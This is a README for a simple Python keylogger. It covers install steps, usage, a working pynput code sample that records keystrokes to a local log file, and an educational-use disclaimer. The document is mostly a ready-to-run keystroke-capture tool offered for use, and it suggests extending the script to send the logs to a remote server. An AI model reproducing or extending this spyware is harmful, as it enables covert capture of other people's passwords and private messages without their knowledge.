# keylogger

📋 Table of Contents
Features
Installation
Usage
How It Works
Customization
Legal Disclaimer
🚀 Features
Captures all alphanumeric and special keys (e.g., space, enter, backspace).
Logs keystrokes in real-time to a file (log.txt).
Lightweight and easy to set up.
📦 Installation
Clone the Repository

bash
Copy code
git clone https://github.com/yourusername/keylogger-python.git
cd keylogger-python
Create a Virtual Environment (Optional but Recommended)

bash
Copy code
python -m venv venv
source venv/bin/activate  # On Windows use `venv\\Scripts\\activate`
Install Dependencies

Make sure you have Python installed (version 3.6 or above).
Install the required Python libraries:
bash
Copy code
pip install pynput
🛠️ Usage
Run the Keylogger

bash
Copy code
python keylogger.py
Viewing Logs

The keystrokes will be saved in a file named log.txt located in the same directory.
Open log.txt to view the captured keystrokes.
🧐 How It Works
This keylogger uses the pynput library to listen for keyboard events.
Every time a key is pressed:
Alphanumeric characters are logged directly.
Special keys (like space, enter, and tab) are logged with their respective actions.
The captured keystrokes are stored in a log.txt file for analysis.
Sample Code Snippet
python
Copy code
from pynput.keyboard import Key, Listener

def write_file(char):
    with open('log.txt', 'a') as f:
        f.write(char)

def on_press(key):
    try:
        if key.char:
            write_file(key.char)
    except AttributeError:
        if key == Key.space:
            write_file(' ')
        elif key == Key.enter:
            write_file('\n')

with Listener(on_press=on_press) as listener:
    listener.join()
⚙️ Customization
Change Log File Name:
Modify the log.txt to any preferred filename in the write_file function.
Add Network Capability:
You can extend this script to send logs to a remote server using the requests library.
⚠️ Legal Disclaimer
This keylogger is developed for educational purposes only. Unauthorized use of this tool to capture keystrokes on devices you do not own or without explicit permission is illegal and unethical. Always seek permission before using this tool on any system.

The author is not responsible for any misuse of this tool.

Next Steps:
